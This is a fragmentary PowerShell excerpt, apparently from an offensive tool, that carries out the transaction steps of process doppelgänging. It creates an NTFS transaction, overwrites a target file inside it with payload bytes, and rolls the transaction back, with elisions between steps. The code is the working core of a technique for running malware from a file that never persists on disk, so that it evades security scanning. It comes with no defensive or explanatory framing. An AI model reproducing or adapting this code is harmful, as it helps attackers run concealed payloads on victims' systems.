...
"@
	...
	# Create transaction
	$hTransaction = [Eidolon]::CreateTransaction([IntPtr]::Zero,[IntPtr]::Zero,0,0,0,0,[IntPtr]::Zero)
	if ($hTransaction -eq -1) {
		$res=[Eidolon]::GetLastError()
		Write-Verbose "[!] CreateTransaction failed..$res"
		$false
		Return
	} else {
		Write-Verbose "[+] Created transaction object"
	}
	
	# Create transacted file
	$hTransactedFile = [Eidolon]::CreateFileTransacted($Runtime.TargetPath,0xC0000000,0,[IntPtr]::Zero,2,0x80,[IntPtr]::Zero,$hTransaction,[IntPtr]::Zero,[IntPtr]::Zero)
	if ($hTransactedFile -eq -1) {
		$res=[Eidolon]::GetLastError()
		Write-Verbose "[!] CreateFileTransacted failed..$res"
		$false
		Return
	} else {
		Write-Verbose "[+] Created transacted file"
	}
	
	# Write transacted file
	$WriteCount = 0
	$CallResult = [Eidolon]::WriteFile($hTransactedFile,$Runtime.PayloadBytes,$Runtime.PayloadBytes.Length,[ref]$WriteCount,[IntPtr]::Zero)
	if (!$CallResult) {
		$res=[Eidolon]::GetLastError()
		Write-Verbose "[!] WriteFile failed..$res"
		$false
		Return
	} else {
		Write-Verbose "[+] Overwriting transacted file"
	}
	...
	$CallResult = [Eidolon]::RollbackTransaction($hTransaction)
	if ($CallResult -eq 0) {
		$res=[Eidolon]::GetLastError()
		Write-Verbose "[!] RollbackTransaction failed..$res"
		$false
		Return
	} else {
		Write-Verbose "[+] Rollbacked Transaction"
	}
